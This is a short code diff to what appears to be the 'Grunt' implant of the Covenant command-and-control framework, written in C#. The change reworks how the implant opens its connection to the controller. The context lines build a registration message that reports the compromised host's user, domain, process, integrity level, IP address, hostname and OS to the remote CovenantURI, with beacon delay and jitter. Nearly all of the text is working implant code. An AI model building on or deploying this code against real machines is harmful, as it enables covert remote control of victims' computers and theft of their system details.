@@ -18,7 +18,7 @@ namespace GruntExecutor
 {
     class Grunt
     {
-        public static void Execute(string CovenantURI, string GUID, Aes SessionKey, TcpClient client)
+        public static void Execute(string CovenantURI, string GUID, Aes SessionKey)
         {
             try
             {
@@ -59,8 +59,7 @@ namespace GruntExecutor
 
                 string RegisterBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(Jitter) + @", ""connectAttempts"": " + Convert.ToString(ConnectAttempts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                 BridgeMessenger baseMessenger = new BridgeMessenger(CovenantURI, GUID, ProfileWriteFormat);
-				baseMessenger.client = client;
-				baseMessenger.stream = client.GetStream();
+				baseMessenger.Connect();
                 TaskingMessenger messenger = new TaskingMessenger
                 (
                     new MessageCrafter(GUID, SessionKey),
